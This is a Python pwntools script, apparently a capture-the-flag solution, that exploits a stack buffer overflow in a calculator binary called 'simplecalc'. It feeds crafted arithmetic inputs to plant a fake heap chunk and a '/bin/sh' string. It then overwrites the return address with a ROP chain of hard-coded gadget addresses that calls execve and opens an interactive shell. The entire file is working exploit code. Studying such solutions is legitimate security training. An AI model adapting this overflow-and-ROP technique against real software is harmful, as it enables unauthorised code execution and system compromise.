from pwn import *

def do_add (p, x, y):

    p.sendline("1")
    p.sendline(str(x))
    p.sendline(str(y))

def do_sub(p, x, y):

    p.sendline("2")
    p.sendline(str(x))
    p.sendline(str(y))

def do_mul(p, x, y):

    p.sendline("3")
    p.sendline(str(x))
    p.sendline(str(y))

def do_div(p, x, y):

    p.sendline("4")
    p.sendline(str(x))
    p.sendline(str(y))


p = process("simplecalc")

# more than 10 ops will cause a buffer overflow. no cookie! :)
# another 8 will overwrite the ret addr

calc_size = 80

p.sendline(str(calc_size))

# create fake chunk using div function's global vars at 0x6c4aa0
do_div(p, 0x900, 0x30)
for _ in xrange(0, 11): 
    do_add(p, 0x20a0a0a0, 0x20a0a0a1)

# need a chunk to free
do_sub(p, 0x6c4ac8, 0x28)
do_sub(p, 0x28, 0x28)

# write "/bin/sh" to add's globals, putting it at a known addr
#do_mul(p, 0x2f62696e, 0x2f736800)
do_add(p, 0x6e69622f, 0x0068732f)

# placeholder
for _ in xrange(0, 3): 
    do_sub(p, 0x28, 0x28)

pop_rax = 0x000000000044db34
pop_rdi = 0x0000000000401b73
pop_rsi = 0x0000000000401c87
pop_rdx = 0x0000000000437a85
bin_sh_ptr = 0x6c4a80
syscall = 0x00000000004648e5

# first gadget, pop rax
do_sub(p, pop_rax + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

#rax val = 59
do_sub(p, 99, 0x28)
do_sub(p, 0x28, 0x28)

#pop rdi
do_sub(p, pop_rdi + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# rdi = bin_sh_ptr
do_sub(p, bin_sh_ptr + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# pop rsi
do_sub(p, pop_rsi + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# rsi = 0
do_sub(p, 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# pop rdx
do_sub(p, pop_rdx + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# rdx = 0
do_sub(p, 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# do syscall
do_sub(p, syscall + 0x28, 0x28)
do_sub(p, 0x28, 0x28)

# exit, triggering rop
p.sendline("5")

p.interactive()
